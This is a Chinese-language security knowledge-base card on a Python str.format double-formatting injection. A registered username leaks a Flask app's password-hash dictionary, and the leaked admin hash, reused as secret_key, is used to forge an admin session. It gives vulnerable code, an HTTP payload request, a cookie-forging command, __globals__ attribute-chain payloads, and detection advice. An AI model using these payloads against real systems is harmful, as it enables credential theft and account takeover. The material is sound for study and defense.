---
id: web-python-ssti-str-format-double-format-dict-leak-flask-secret
title: Python str.format 二次格式化注入：注册用户名 {users.passwords} 泄露账号哈希并作为 Flask secret_key 伪造 session
type: scenario
domain: web
path: web/python/ssti
technique: str-format-double-format-field-injection-dict-leak
tags:
- python
- flask
- format-string
- template-injection
- credential-leak
- session-forgery
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V392
  verified_at: '2026-11-09T11:42:24+08:00'
  notes: 已对照原文全文与全部25图核对：register() 的 .format(username).format(users) 双次格式化、注册 {users.passwords} 后响应图16 实际输出 {'admin':'036197...','{users.passwords}':'c4ca...'} 且 admin 哈希=secret_key、图17/18 flask_session_cookie_manager 解码/伪造 admin 均一致。本机用 Python 复跑该双格式化语义确认结果；已修正原卡响应示例（字典出现在 username 位置、方括号内 {users.passwords} 是字面键）使其与图16一致。与既有 session 伪造卡、redis format-globals 卡入口/密钥来源不同，dedup related/new 成立。未在靶场复跑。frontmatter 无 sources/source_url/文章ID。
url: /docs/web/python/ssti/web-python-ssti-str-format-double-format-dict-leak-flask-secret/
draft: false
kb_aliases:
- Python 格式化字符串注入
- str.format 字段注入
- 二次 format 泄露密码
- '{users.passwords} 注册'
- format string vulnerability
- Flask secret_key 泄露
---

## 一句话结论

当注册/登录等接口把用户输入插入一个字符串、随后又对该字符串调用一次 `.format(...)`（例如先 `.format(username=username)` 再 `.format(users=users)`）时，用户输入里的 `{users.passwords}` 会在第二次格式化时被当作字段表达式求值，直接把整个用户名→密码哈希字典打印出来；若应用又把其中 admin 的哈希当作 Flask `secret_key`，泄露后即可用该密钥签出 admin 会话，完成从格式串注入到后台接管的升级。

## 原理

- **Python format 字段语法**：`str.format` 解析 `{field}`，field 由 arg_name（位置/关键字参数名）加若干 `.attr` 或 `[index]` 组成，例如 `{users.passwords}` 表示“取关键字参数 `users` 的 `passwords` 属性”，`{users.passwords[admin]}` 表示再按字符串键 `admin` 取值（方括号内不加引号也按字符串处理）。
- **二次格式化的关键**：`str.format` 不会把替换进去的值再次当作格式串解析。因此第一次 `.format(username=username)` 中，攻击者注册的用户名 `{users.passwords}` 作为普通文本被插入结果串；随后代码对这个结果串再执行 `.format(users=users)`，这一次花括号被当作真正的字段表达式，`users.passwords` 被求值并 `str()` 后拼进响应。
- **漏洞代码形态**：
  ```python
  msg = "Register success! Your username is {username} with hash: {{users.passwords[{username}]}}."
  msg = msg.format(username=username)   # 用户输入被插入，花括号成为字面量
  msg = msg.format(users=users)         # 第二次格式化求值 {users.passwords[...]}
  return msg
  ```
  攻击者注册用户名 `{users.passwords}`，第二次格式化就输出整个字典（用户名 → md5 哈希）。
- **为什么能打穿到 session**：示例应用把 `app.secret_key` 与 `users.passwords['admin']` 赋成同一个值（`hashlib.md5(os.urandom(32)).hexdigest()`）。Flask session 是“签名而非加密”的 itsdangerous cookie，拿到 `secret_key` 就能为任意内容（如 `{'username':'admin'}`）生成合法签名，服务端无法区分。
- **与 eval/模板注入的区别**：格式串注入不能直接执行任意代码（字段语法只允许属性/下标访问），但可以读取任意可达对象的属性与字典键；对配置对象、ORM 对象、用户字典等做属性遍历常能拿到密钥、凭据、flag。若对象图能到 `__class__`/`__init__.__globals__`，还可进一步读取模块全局变量。
- **前提**：字段表达式在第二次 `.format` 的作用域内可解析（`users` 确实是关键字参数）；用户名等输入未被转义花括号；响应回显了格式化结果。

## 触发条件

- 代码把用户可控输入放进字符串后又对该字符串执行 `.format()`/`.format_map()`（单次 `.format(username=...)` 不会重解析替换值，需存在第二次格式化或用户输入直接作为格式串）。
- 格式串作用域里有敏感对象：用户字典、配置对象、密钥、ORM 查询集等，且可经属性/下标到达。
- 回显格式化结果（注册成功页、错误页、日志页面等）。
- 该密钥同时用于 session 签名（Flask `secret_key`）或其他信任边界。

## 利用步骤

1. 审计/黑盒确认格式化点：注册后响应里出现用户名与“hash: {...}”之类内容，说明用户名被放进格式串；尝试用户名 `{users.passwords}`、`{config}` 等观察是否被求值。
2. 用 `{users.passwords}` 注册，读取响应中的完整字典（用户名→哈希）；也可用 `{users.passwords[admin]}` 定向读取 admin 哈希。
3. 若该哈希就是 Flask `secret_key`（源码/报错/配置可确认），用 flask-session-cookie-manager 伪造 admin 会话。
4. 携带伪造 cookie 访问后台或高权接口，继续后续利用（上传、模板、命令执行等）。
5. 若字段访问不到目标对象，尝试属性链：`{users.__class__.__init__.__globals__[os]}`、`{config.__class__.__init__.__globals__}` 等（可读性取决于作用域与对象类型）。

## PoC

```python
# 漏洞代码（示意）
from Users import Users
users = Users()
msg = "Your username is {username} with hash: {{users.passwords[{username}]}}."
msg = msg.format(username=username)   # username = "{users.passwords}"
msg = msg.format(users=users)         # 求值 {users.passwords}
return msg
```

```http
POST /register.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

username={users.passwords}&password=1
```

```text
响应示例（实测语义）：第一个 {users.passwords} 求值成整个字典并显示在 username 位置；
第二个花括号的方括号内是字面键 {users.passwords}，恰好等于刚注册的用户名，因此取到该用户的 hash：
Register success! Your username is {'admin': '<admin_hash>', '{users.passwords}': '<md5>'} with hash: <该用户的 md5>
```

```bash
# 用泄露的 admin 哈希作为 Flask secret_key 伪造会话
python3 flask_session_cookie_manager3.py encode -s '<admin_hash>' -t "{'username': 'admin'}"
# 将输出的 cookie 作为 session 访问后台
```

说明：以上按原文链结构整理，未在本机执行；实际字段名/关键字参数以目标源码为准。

## 变体与关联

- **格式串变体**：`format_map(mapping)`、`string.Template`（`$` 语法）、日志格式化（`logging.info(user_input)` 一般不会求值属性，但 `%`/`{}` 混用可能出错）、`"{}".format(**user_dict)` 的键注入。
- **泄露目标变体**：`{config}`、`{settings.SECRET_KEY}`、`{users.passwords}`、`{obj.__dict__}`；属性链到 `__globals__` 可读模块全局。
- **升级变体**：泄露 Flask `secret_key` 后伪造 session（见 [[web-python-ssti-jinja2-adjacent-literal-flask-session-forge]]）；泄露数据库/云凭据后横向；泄露 SMTP/API key。
- **关联**：[[web-python-ssti-redis-prompt-cache-poison-format-globals]]（缓存模板被污染后 `str.format` 求值 `__globals__`，同属 format 字段求值）；[[web-python-ssti-django-username-template-source-credential-leak]]（用户名拼进 Django 模板源泄露账号密码，属于模板引擎注入的另一类）。
- **边界**：单次 `.format` 且用户输入仅作为参数值时不会重解析花括号；用户输入被 `{{`/`}}` 转义、格式化对象不可达敏感属性、或响应不回显时，利用受阻。

## 检测与防御

- **代码层**：不要把用户输入当格式串；`.format` 只应用于固定模板，用户数据一律作为参数传入；对可能含花括号的用户名做转义或改用字符串拼接/参数化输出。
- **密钥管理**：`secret_key` 使用独立随机值，不复用用户密码哈希；泄露后立即轮换并使全部 session 失效。
- **检测**：注册/登录请求的用户名字段出现 `{`、`}`、`.passwords`、`__class__`、`__globals__` 等；响应体出现字典/配置 repr；同一账号注册后立即出现 admin 会话。
- **加固**：后台鉴权不只看 session 中的用户名，敏感操作二次校验；对格式化输出做长度/内容审计；日志中不打印格式化后的敏感对象。
